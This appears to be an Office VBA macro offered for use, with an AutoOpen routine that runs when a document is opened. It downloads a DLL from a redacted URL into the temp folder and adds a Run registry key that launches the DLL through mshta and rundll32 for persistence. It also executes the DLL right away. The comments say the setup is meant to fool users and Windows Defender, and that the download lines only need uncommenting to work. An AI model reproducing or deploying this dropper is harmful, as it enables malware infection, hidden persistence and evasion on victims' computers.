' In order to Use, "uncomment" lines 12 - 23

Sub AutoOpen()

' File %TEMP% Directory
tempFolder = Environ("TEMP")
FileName = tempFolder & "\crypto32.dll"
RegValueName = "Startup"

'  If the dll does not exist in the directory, download it.
If Dir(FileName) = "" Then
    Dim WinHttp As Object
    URL = "<redacted>"
    Set WinHttp = CreateObject("Microsoft.XMLHTTP")
    ########### WinHttp.Open "GET", URL, False
    ########### WinHttp.Send
 
    ########### URL = WinHttp.ResponseBody
    ########### If WinHttp.Status = 200 Then
    ###########     Set oStream = CreateObject("ADODB.Stream")
    ###########		oStream.Open
    ########### 	oStream.Type = 1
	###########     oStream.Write WinHttp.ResponseBody
	###########     oStream.SaveToFile FileName
	###########     oStream.Close
    ########### End If
    
	' Write a registry key for persistence that runs on boot. 
	' Use mshta to run rundll32.
	' That way when we use Task Manager, we only see a signed Microsoft Program running on Startup ( Only fools the regular user and Windows Defender ).
    Escaped_FileName = Replace(FileName, "\", "\\")
    Set WshShell = CreateObject("WScript.Shell")
    myKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & RegValueName
    myVal = "mshta javascript:(new%20ActiveXObject(""WScript.Shell"")).run(""rundll32 " & Escaped_FileName & ",#2"");close();"
    WshShell.RegWrite myKey, myVal, "REG_SZ"
    
    ' Also run the exported second exported function on Document Open
    WshShell.Run "rundll32.exe " & FileName & ",#2", 0, True
    
End If
End Sub

